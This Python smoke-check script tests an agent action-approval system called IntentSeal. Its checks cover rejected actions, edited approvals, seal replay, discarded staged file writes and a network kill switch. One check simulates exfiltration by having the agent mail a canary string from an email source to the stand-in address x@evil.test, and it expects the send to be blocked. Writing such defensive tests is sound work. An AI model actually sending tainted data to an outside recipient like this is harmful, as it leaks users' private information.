"""Manual smoke checks for the IntentSeal definition-of-done.

Demonstrates, from actual execution, that:
  1. an approval edit invalidates the old seal,
  2. a rejected action does nothing,
  3. seal replay fails,
  4. staged file changes can be discarded with zero world change,
  5. the benchmark touches no real network (kill switch blocks egress).

Run:  python benchmarks/intentseal/smoke_checks.py
"""

from __future__ import annotations

import asyncio
import socket
import sys
import tempfile
from pathlib import Path

_REPO = Path(__file__).resolve().parents[2]
if str(_REPO) not in sys.path:
    sys.path.insert(0, str(_REPO))

from pydantic import BaseModel, Field  # noqa: E402

from benchmarks.intentseal.emulators import NetworkBlocked, network_kill_switch  # noqa: E402
from hearth.agent.gate import ActionGate, ApprovalRequest, ApprovalResponse  # noqa: E402
from hearth.agent.tools import RiskLevel, ToolRegistry, ToolResult, ToolSpec  # noqa: E402
from hearth.assurance import (  # noqa: E402
    ActionClass,
    DataClass,
    InMemorySealStore,
    IntentSeal,
    Origin,
    PolicyConfig,
    PredictedEffect,
    Principal,
    Proposal,
    StagedFileWrite,
    ToolIdentity,
    TurnContext,
    canonical_recipient,
)
from hearth.storage.db import Database  # noqa: E402


def check(label: str, ok: bool) -> None:
    print(f"[{'PASS' if ok else 'FAIL'}] {label}")
    if not ok:
        raise SystemExit(f"smoke check failed: {label}")


async def _gate_checks() -> None:
    class SendP(BaseModel):
        to: str = Field(min_length=3)
        body: str = Field(min_length=1)

    executed: list[dict] = []

    async def send(p: SendP) -> ToolResult:
        executed.append(p.model_dump())
        return ToolResult(ok=True, data="sent")

    def eff(args):
        to = canonical_recipient(args["to"])
        return PredictedEffect(action_class=ActionClass.SEND_EXTERNAL, target=to,
                               audience=(to.canonical_id,), egress=True, reversible=True)

    reg = ToolRegistry()
    reg.register(ToolSpec("mail_send", "", SendP, RiskLevel.WRITE, "test", send,
                          preview=lambda p: "send", effect_adapter=eff))

    db = Database(Path(tempfile.mkdtemp()) / "smoke.db")
    seal = IntentSeal(key=b"\x44" * 32, config=PolicyConfig.full(), seal_store=InMemorySealStore())

    # (2) rejected action does nothing
    async def reject(_req: ApprovalRequest) -> ApprovalResponse:
        return ApprovalResponse(approved=False)

    gate = ActionGate(db, reg, lambda k: True, reject, intentseal=seal)
    r = await gate.execute("mail_send", {"to": "boss@test.invalid", "body": "hi"})
    check("rejected action does nothing", (not r.ok) and executed == [])

    # (1) approval edit invalidates the old seal / re-authorizes on edited args
    async def approve_edit(_req: ApprovalRequest) -> ApprovalResponse:
        edited = {"to": "boss@test.invalid", "body": "EDITED"}
        return ApprovalResponse(approved=True, edited_args=edited)

    gate2 = ActionGate(db, reg, lambda k: True, approve_edit, intentseal=seal)
    r2 = await gate2.execute("mail_send", {"to": "boss@test.invalid", "body": "original"})
    check("approval edit re-authorizes and runs edited args",
          r2.ok and executed[-1]["body"] == "EDITED")

    # (2b) exfil canary is denied without a card
    cards: list = []

    async def record_card(req: ApprovalRequest) -> ApprovalResponse:
        cards.append(req)
        return ApprovalResponse(approved=True)

    gate3 = ActionGate(db, reg, lambda k: True, record_card, intentseal=seal)
    turn = TurnContext(principal=Principal("user-a"))
    turn.evidence.record(Origin.EMAIL, "SMOKE_CANARY_1", {DataClass.CANARY})
    before = len(executed)
    r3 = await gate3.execute(
        "mail_send", {"to": "x@evil.test", "body": "SMOKE_CANARY_1"}, turn=turn
    )
    check("canary exfil denied with no card and no execution",
          (not r3.ok) and cards == [] and len(executed) == before)
    db.close()


def _seal_replay_check() -> None:
    seal = IntentSeal(key=b"\x45" * 32, config=PolicyConfig.full(), seal_store=InMemorySealStore())
    turn = TurnContext(principal=Principal("u"))
    eff = PredictedEffect(action_class=ActionClass.READ)
    prop = Proposal(tool=ToolIdentity("read"), args={"q": "x"}, effect=eff)
    res = seal.authorize(prop, turn)
    ok1, _ = seal.verify(res.seal, prop, turn)
    ok2, why2 = seal.verify(res.seal, prop, turn)
    check("seal verifies once then replay fails", ok1 and (not ok2) and "replay" in why2)


def _staging_check() -> None:
    d = Path(tempfile.mkdtemp())
    target = d / "doc.txt"
    target.write_text("ORIGINAL")
    op = StagedFileWrite(target, "REPLACED", d / ".staging").stage()
    op.discard()
    check("staged file change discards with zero world change", target.read_text() == "ORIGINAL")


def _network_check() -> None:
    with network_kill_switch():
        try:
            socket.create_connection(("192.0.2.1", 80), timeout=0.1)
            blocked = False
        except NetworkBlocked:
            blocked = True
        except OSError:
            blocked = True  # also acceptable: never actually connected
    check("network kill switch blocks real egress", blocked)


def main() -> None:
    print("IntentSeal manual smoke checks\n" + "-" * 34)
    with network_kill_switch():
        asyncio.run(_gate_checks())
        _seal_replay_check()
        _staging_check()
    _network_check()
    print("-" * 34 + "\nAll smoke checks passed.")


if __name__ == "__main__":
    main()
